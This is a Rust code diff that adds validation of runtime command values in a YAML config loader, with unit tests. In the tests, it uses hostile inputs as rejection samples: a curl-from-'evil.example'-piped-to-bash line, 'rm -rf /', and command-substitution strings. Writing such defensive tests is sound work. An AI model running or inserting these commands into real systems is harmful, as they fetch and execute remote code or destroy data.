@@ -3,7 +3,7 @@
 // FEAT-REPORT-001
 // REQ-CORE-009
 
-use anyhow::{Context, Result};
+use anyhow::{Context, Result, bail};
 use serde::{Deserialize, Deserializer, Serialize};
 use std::{
     fs,
@@ -213,6 +213,47 @@ pub fn config_path(workspace_root: &Path) -> PathBuf {
 }
 
 // FEAT-CHECK-001
+/// Validate a runtime `command` value from `syu.yaml`.
+///
+/// Rejects values that look like shell expressions, contain whitespace, or
+/// include shell metacharacters.  Absolute paths must point to an existing
+/// file.  Bare executable names (e.g. `python3`) are accepted as-is;
+/// existence is checked later by PATH search in `resolve_runtime_command`.
+fn validate_runtime_command(field: &str, command: &str) -> Result<()> {
+    let trimmed = command.trim();
+    if trimmed.is_empty() || trimmed.eq_ignore_ascii_case("auto") {
+        return Ok(());
+    }
+
+    const SHELL_METACHARACTERS: &[char] = &[
+        ';', '|', '&', '$', '`', '!', '(', ')', '{', '}', '<', '>', '\'', '"', '\\', '\n', '\r',
+    ];
+
+    if let Some(bad) = SHELL_METACHARACTERS.iter().find(|&&c| trimmed.contains(c)) {
+        bail!(
+            "runtimes.{field}.command contains the shell metacharacter '{bad}', which is not \
+             allowed. Use a bare executable name (e.g. `python3`) or an absolute path."
+        );
+    }
+
+    if trimmed.contains(' ') {
+        bail!(
+            "runtimes.{field}.command contains a space. Use a bare executable name or an \
+             absolute path without spaces."
+        );
+    }
+
+    let path = Path::new(trimmed);
+    if path.is_absolute() && !path.is_file() {
+        bail!(
+            "runtimes.{field}.command is an absolute path `{trimmed}` that does not exist. \
+             Verify the path or use `auto` to let syu discover the runtime automatically."
+        );
+    }
+
+    Ok(())
+}
+
 pub fn load_config(workspace_root: &Path) -> Result<LoadedConfig> {
     let path = config_path(workspace_root);
     if !path.is_file() {
@@ -227,6 +268,11 @@ pub fn load_config(workspace_root: &Path) -> Result<LoadedConfig> {
         .with_context(|| format!("failed to read config from `{}`", path.display()))?;
     let config: SyuConfig = serde_yaml::from_str(&raw)
         .with_context(|| format!("failed to parse config from `{}`", path.display()))?;
+
+    validate_runtime_command("python", &config.runtimes.python.command)
+        .with_context(|| format!("invalid runtime config in `{}`", path.display()))?;
+    validate_runtime_command("node", &config.runtimes.node.command)
+        .with_context(|| format!("invalid runtime config in `{}`", path.display()))?;
 
     Ok(LoadedConfig {
         path,
@@ -411,5 +457,65 @@ mod tests {
 
         let error = load_config(tempdir.path()).expect_err("blank version should fail");
         assert!(error.to_string().contains("failed to parse config"));
+    }
+
+    #[test]
+    fn validate_runtime_command_accepts_bare_name() {
+        assert!(super::validate_runtime_command("python", "python3").is_ok());
+        assert!(super::validate_runtime_command("node", "node").is_ok());
+        assert!(super::validate_runtime_command("node", "bun").is_ok());
+    }
+
+    #[test]
+    fn validate_runtime_command_accepts_auto() {
+        assert!(super::validate_runtime_command("python", "auto").is_ok());
+        assert!(super::validate_runtime_command("python", "AUTO").is_ok());
+        assert!(super::validate_runtime_command("python", "  auto  ").is_ok());
+        assert!(super::validate_runtime_command("python", "").is_ok());
+    }
+
+    #[test]
+    fn validate_runtime_command_rejects_shell_metacharacters() {
+        for bad in &[
+            "curl https://evil.example | bash #",
+            "python3; rm -rf /",
+            "$(malware)",
+            "`malware`",
+            "python3 && malware",
+            "python3 > /tmp/out",
+            "python3 < /tmp/in",
+        ] {
+            assert!(
+                super::validate_runtime_command("python", bad).is_err(),
+                "expected error for: {bad}"
+            );
+        }
+    }
+
+    #[test]
+    fn validate_runtime_command_rejects_command_with_spaces() {
+        let error =
+            super::validate_runtime_command("python", "python3 -c print").expect_err("spaces");
+        assert!(error.to_string().contains("space"));
+    }
+
+    #[test]
+    fn validate_runtime_command_rejects_nonexistent_absolute_path() {
+        let error =
+            super::validate_runtime_command("python", "/nonexistent/bin/python3").expect_err("abs");
+        assert!(error.to_string().contains("does not exist"));
+    }
+
+    #[test]
+    fn load_config_rejects_malicious_runtime_command() {
+        let tempdir = tempdir().expect("tempdir should exist");
+        fs::write(
+            tempdir.path().join(CONFIG_FILE_NAME),
+            "runtimes:\n  python:\n    command: \"curl https://evil.example | bash\"\n",
+        )
+        .expect("config should exist");
+
+        let error = load_config(tempdir.path()).expect_err("malicious command should be rejected");
+        assert!(error.to_string().contains("invalid runtime config"));
     }
 }
